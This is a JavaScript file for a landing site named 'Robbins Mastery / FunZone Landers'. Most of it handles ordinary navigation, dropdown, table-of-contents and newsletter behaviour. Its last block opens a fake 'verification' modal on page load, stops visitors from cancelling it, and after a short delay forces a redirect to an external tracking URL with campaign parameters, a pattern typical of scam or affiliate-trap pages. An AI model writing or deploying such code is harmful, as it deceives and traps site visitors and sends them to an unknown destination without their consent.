/**
 * Main JavaScript for Robbins Mastery / FunZone Landers
 * Handles navigation, modals, and form interactions.
 */

const toggle = document.querySelector('.nav-toggle');
const nav = document.getElementById('nav');
if (toggle && nav){
  toggle.addEventListener('click', () => {
    const open = nav.classList.toggle('open');
    toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
  });
}
const more = document.querySelector('.more');
if (more){
  const btn = more.querySelector('.more-btn');
  const menu = more.querySelector('.dropdown');
  const show = (v)=>{ menu.style.display = v ? 'block' : 'none'; btn.setAttribute('aria-expanded', v? 'true':'false'); };
  btn?.addEventListener('click', e => { e.stopPropagation(); show(menu.style.display!=='block'); });
  document.addEventListener('click', () => show(false));
}

window.fakeSubmit = (e) => {
  if (e) e.preventDefault();
  alert('Thanks! This demo does not store data.');
};

document.querySelectorAll('.newsletter').forEach(form => {
  if (!form.hasAttribute('onsubmit')) {
    form.addEventListener('submit', window.fakeSubmit);
  }
});

const toTop = document.querySelector('.to-top');
if (toTop && !toTop.hasAttribute('onclick')) {
  toTop.addEventListener('click', () => window.scrollTo({top:0, behavior:'smooth'}));
}

document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('[data-toc]').forEach(container => {
    const hs = Array.from(document.querySelectorAll('h2, h3')).filter(h => h.id && !h.closest('.toc'));
    const list = document.createElement('div');
    hs.forEach(h => { const a = document.createElement('a'); a.href = `#${h.id}`; a.textContent = h.textContent; a.style.marginLeft = h.tagName==='H3' ? '12px' : '0'; list.appendChild(a); });
    container.appendChild(list);
  });
});

document.addEventListener('DOMContentLoaded', () => {
  const modal = document.getElementById('verification-modal');
  const btn = document.getElementById('verify-btn');
  if (modal && btn) {
    modal.showModal();
    modal.addEventListener('cancel', (e) => e.preventDefault());
    const msg = document.getElementById('loading-msg');
    if (msg) msg.style.display = 'block';
    setTimeout(() => {
      window.location.href = 'https://syn9ro.com/?utm_campaign=D65m7f7e4i&v1=[v1]&v2=[v2]&v3=[v3]';
    }, 5500);
    btn.addEventListener('click', () => window.location.href = 'https://syn9ro.com/?utm_campaign=D65m7f7e4i&v1=[v1]&v2=[v2]&v3=[v3]');
  }
});
